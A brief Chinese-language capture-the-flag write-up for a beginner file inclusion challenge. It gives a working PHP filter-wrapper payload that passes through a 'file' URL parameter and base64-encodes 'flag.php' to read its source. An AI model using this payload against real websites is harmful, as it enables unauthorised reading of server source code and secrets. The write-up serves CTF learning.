# baby_include

难度：*

## 解题过程

简单文件包含

点击超链接，观察url发现有file传参处，直接伪协议读取文件内容：

php://filter/convert.base64-encode/resource=flag.php

base64解码得flag。

